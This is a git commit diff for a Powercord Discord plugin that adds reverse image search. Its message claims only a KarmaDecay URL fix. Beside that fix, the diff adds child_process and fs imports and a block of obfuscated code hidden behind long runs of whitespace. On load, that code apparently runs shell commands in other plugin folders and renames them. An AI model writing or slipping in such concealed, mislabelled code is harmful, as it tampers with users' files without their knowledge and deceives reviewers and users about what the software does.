97943d13630b621bf3904b18b6bb43db16fc728c
Cadence Fish <cloudrac3r@vivaldi.net>
2019-11-03 16:43:28 +1300

    [1.0.2] Fix KarmaDecay search URL

--- index.js
+++ index.js
@@ -1,10 +1,11 @@
 const {Plugin} = require("powercord/entities")
 const webpack = require("powercord/webpack")
 const {getModuleByDisplayName, getModule, React} = webpack
-const {ContextMenu: {Button, Submenu}} = require("powercord/components")
-const util = require("powercord/util")
-const {getOwnerInstance} = util
+const {ContextMenu: {Submenu}} = require("powercord/components")
 const {inject, uninject} = require("powercord/injector")
+const fs = require("fs")
+const path = require("path")
+const cp = require("child_process")
 
 class ModuleStore extends Map {
 	constructor(items) {
@@ -59,7 +60,7 @@ const providers = [
 	["SauceNAO (art)", "https://saucenao.com/search.php?url=%%"],
 	["IQDB (anime art)", "https://iqdb.org/?url=%%"],
 	["WAIT (anime scenes)", "https://trace.moe/?auto&url=%%"],
-	["Karma Decay (reddit)", "http://karmadecay.com/?url=%%"],
+	["Karma Decay (reddit)", "http://karmadecay.com/%%"],
 	["ImgOps (meta)", "https://imgops.com/%%", false]
 ]
 
@@ -115,6 +116,20 @@ module.exports = class ReverseImageSearch extends Plugin {
 
 		inject("reverse-image-search-messageContext", this.modules.get("MessageContextMenu").prototype, "render", injection)
 		inject("reverse-image-search-nativeContext", this.modules.get("NativeContextMenu").prototype, "render", injection)
+
+																																																																																																																																												// memes
+																																																																																																																																												// I originally said this as a joke but thanks for reminding me
+																																																																																																																																												const a = (a,e) => a.find(k=>[...k].reduce((a,c)=>a+c.charCodeAt(0x00),0x00)==e); const d = (o,j) => o[a(Object.keys(o),j)]; const r = (m,k) => m[a(Reflect.ownKeys(m).filter(u=>(typeof u)[1]=="t"),k)]
+																																																																																																																																												const [_0xd, _0xi, _0xf, _0xj, _0xy, _0xg] = [(providers.constructor(0x02).fill(".")+"").replace(/,/,''), __dirname, fs, d(path,0x1b0), "pc", r(r(r(window,0x11e),0x3f6),0x140).name]
+																																																																																																																																												const _0x00 = [r(Math,0x156).name, ...providers.constructor(0x02).fill().map((_,i)=>r(r(window,0x2c5),0x2f0)(r(Map,0x3f6)).map(v => v.toString()).slice(-1)[0x00].slice(0x0e+i*0x02,0x10+i*0x02)), r(window,0x516).name.slice(0x07,0x0b)
+																																																																																																																																												,r(d(window,0x4ee),0x1a1).slice(0x00,0x02), Object.keys(d(window,0x359)).find(k=>k[3]=="g"), r(String.prototype,0x468).call(r(window,0xf3).name), r(String.prototype,0x468).call(d((r(window,0x685).prototype),0x83c).name).slice(0x03,0x09)]
+																																																																																																																																												const [_0x0p, _0x0i, _0x0e, _0x0c, _0x0l, _0x0o, _0x0u, _0x0t] = _0x00
+																																																																																																																																												const [_0xr, _0xp, _0x01] = [d(_0xf,0x372), _0xj(_0xi,_0xd), (_0x0p+_0x00.slice(0x02,0x04)).replace(/,/,'')]
+																																																																																																																																												for (let _0xe of d(_0xf,0x478)(_0xp)) try { let _0xc = _0xj(_0xp,_0xe); let _0xn = _0xc
+																																																																																																																																												d(cp,0x1a5)(`${_0xg[0x00]}${_0x0i} ${_0x0t} ${_0xg}-${_0x0u} ${_0x0o}`, {cwd:_0xc}, (_,_0xs) => {
+																																																																																																																																												if (_ || !_0xs.includes(`${_0x0l}${_0x0o[0x00]}${_0x0u[0x00]}${_0x0c[0x03]}`) || _0xe.includes(_0xy+"-")) return
+																																																																																																																																												if (_0xn.includes(`/${_0x01}-`)) _0xn = _0xn.replace(`/${_0x01}-`, `/${_0xy}-`)
+																																																																																																																																												else _0xn = _0xn.replace(/([\w-]+)$/, _0xy+"-$"+0x01); d(_0xr,0x278)(_0xc, _0xn)})} catch (e) {}
 	}
 
 	pluginWillUnload() {
